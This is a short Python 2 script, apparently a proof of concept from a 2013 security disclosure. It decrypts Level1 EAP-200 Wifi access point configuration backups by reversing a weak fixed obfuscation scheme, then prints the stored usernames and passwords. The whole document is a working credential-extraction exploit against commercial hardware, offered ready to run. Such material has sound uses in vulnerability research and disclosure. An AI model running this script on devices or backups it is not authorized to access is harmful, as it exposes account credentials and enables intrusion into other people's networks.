# tellpassword.py
#
# Extracts user accounts from Level1 (ip4net)
# EAP-200 (and other) Wifi Access Points
#
# (c) 2013 sigma star gmbh

import sys, re

attribRegex = re.compile(r"(\w+)=\"([^\"]*)\"")

if (len(sys.argv) != 2):
    print "USAGE: %s config-backup.conf" % sys.argv[0]
    exit(1)

# decrypt config
encrypted = open(sys.argv[1], 'rb')
plain = open('plain.xml', 'w')
cntr = 0
encrypted.seek(128)
byte = encrypted.read(1)
print "Decrypting config file into plain.xml"
while byte:
    plainOrd = ((ord(byte) ^ 0xff) + cntr) % 0x80
    plain.write(chr(plainOrd))
    cntr = (cntr + 1) % 0x40
    byte = encrypted.read(1)
encrypted.close()
plain.close()

# find user accounts
print "Parsing accounts..."
plain = open('plain.xml', 'r')
for line in plain:
    if "<user" in line:
        user = None
        password = None
        for match in attribRegex.finditer(line):
            attrib = match.group(1)
            if attrib == "name":
                user = match.group(2)
            elif attrib == "password":
                password = match.group(2)
        if len(password) > 0:
                print " - %s: %s" % (user, password)
plain.close()
